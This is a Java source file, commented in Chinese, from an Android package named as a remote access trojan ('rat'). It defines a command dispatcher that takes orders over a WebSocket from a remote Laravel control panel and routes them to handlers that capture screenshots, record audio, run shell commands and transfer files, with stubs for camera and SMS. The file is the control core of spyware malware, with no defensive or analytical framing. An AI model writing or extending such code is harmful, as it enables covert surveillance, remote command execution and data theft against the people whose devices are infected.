package com.vendor.rat.control.handler;

import android.util.Log;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.network.WebSocketClient;
import com.vendor.rat.service.CommandHandler;

/**
 * 指令分发器 (唯一的 WebSocket CommandListener)
 *
 * 路由逻辑:
 *   type="screencomd" → dispatchScreenCommand (Laravel PanelSendHandler 命令)
 *   type="engine"     → CommandHandler (引擎控制命令)
 *   type=数字         → 旧格式兼容 (本地 HttpCommandServer)
 */
public class CommandDispatcher implements WebSocketClient.CommandListener {

    private static final String TAG = "CommandDispatcher";

    private ScreenshotHandler screenshotHandler;
    private AudioRecordHandler audioRecordHandler;
    private ShellCommandHandler shellCommandHandler;
    private FileTransferHandler fileTransferHandler;
    private CommandHandler engineHandler;

    public CommandDispatcher() {
        screenshotHandler = new ScreenshotHandler();
        audioRecordHandler = new AudioRecordHandler();
        shellCommandHandler = new ShellCommandHandler();
        fileTransferHandler = new FileTransferHandler();
    }

    /**
     * 注册到 WebSocket 客户端 (唯一入口)
     */
    public void register() {
        WebSocketClient wsClient = NetworkManager.getInstance().getWebSocketClient();
        if (wsClient != null) {
            wsClient.setCommandListener(this);
        }
    }

    /**
     * 设置引擎命令处理器 (委托给 CommandHandler)
     */
    public void setEngineHandler(CommandHandler handler) {
        this.engineHandler = handler;
    }

    @Override
    public void onCommand(String type, String subc, JsonObject json) {
        try {
            // Laravel PanelSendHandler 下发: type="screencomd", subc="Screen/SMS/..."
            if ("screencomd".equals(type)) {
                dispatchScreenCommand(subc, json);
                return;
            }

            // 兼容旧数字 type 格式 (来自本地 HttpCommandServer)
            if (json.has("type") && json.get("type").isJsonPrimitive()) {
                try {
                    int numType = json.get("type").getAsInt();
                    switch (numType) {
                        case 10: screenshotHandler.handle(json); break;
                        case 11: audioRecordHandler.handle(json); break;
                        case 12: // fall through
                        case 13: fileTransferHandler.handle(json); break;
                        case 14: shellCommandHandler.handle(json); break;
                        default:
                            Log.w(TAG, "Unknown numeric command type: " + numType);
                    }
                    return;
                } catch (NumberFormatException ignored) {
                    // type is string, not number — fall through
                }
            }

            // 引擎控制命令 → 委托给 CommandHandler
            if ("engine".equals(type) || (json.has("cmd") && !json.get("cmd").getAsString().isEmpty())) {
                if (engineHandler != null) {
                    engineHandler.onCommand(type, subc, json);
                }
                return;
            }

            Log.w(TAG, "Unhandled command: type=" + type + ", subc=" + subc);
        } catch (Exception e) {
            Log.e(TAG, "Failed to dispatch command", e);
        }
    }

    /**
     * 分发 Laravel screencomd 命令
     * 对齐 PanelSendHandler 的 30+ 个命令
     */
    private void dispatchScreenCommand(String subc, JsonObject payload) {
        if (subc == null) {
            Log.w(TAG, "screencomd with null subc");
            return;
        }
        switch (subc) {
            case "Screen":      screenshotHandler.handle(payload); break;
            // TODO: 其他命令在各模块实现后补充
            // case "Camera":   break;
            // case "SMS":      break;
            // case "files":    break;
            default:
                Log.d(TAG, "screencomd not yet handled: " + subc);
        }
    }
}
